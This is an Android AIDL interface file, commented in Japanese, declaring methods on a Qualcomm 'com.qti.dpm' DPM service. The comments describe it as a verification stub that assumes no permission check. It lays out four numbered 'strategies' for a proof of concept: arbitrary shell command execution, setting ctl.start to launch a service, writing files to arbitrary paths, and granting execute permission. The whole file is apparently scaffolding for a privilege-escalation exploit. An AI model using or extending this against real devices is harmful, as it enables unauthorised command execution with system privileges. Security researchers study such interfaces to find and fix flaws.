// パッケージ宣言は元のまま
package com.qti.dpm;

/**
 * DPM Service 内部インターフェース（権限チェックなしを想定した検証用）
 * 全引数に in 方向指定子を明示することで、最新AIDLコンパイラでもエラーにならない
 */
interface IDpmService {
    /**
     * 戦略①: 直接シェルコマンド実行
     * @param command 実行するシェル文字列（例: "id > /data/local/tmp/poc.txt"）
     */
    void executeShellCommand(in String command);

    /**
     * 戦略②: システムプロパティ操作（ctl.start によるサービス起動誘導）
     * @param key   プロパティキー（例: "ctl.start"）
     * @param value プロパティ値（例: "exec_dpm_poc"）
     */
    void setSystemProperty(in String key, in String value);

    /**
     * 戦略③: 任意パスへのバイナリ/スクリプト書き込み
     * @param path    書き込み先フルパス（例: "/data/local/tmp/run.sh"）
     * @param content 書き込むバイト配列（UTF-8文字列などを変換して渡す）
     */
    void writeFile(in String path, in byte[] content);

    /**
     * 戦略④: ファイルパーミッション変更（実行ビット付与）
     * @param path 対象ファイルパス
     * @param mode chmod 数値（例: 0755）
     */
    void setFilePermissions(in String path, in int mode);
}
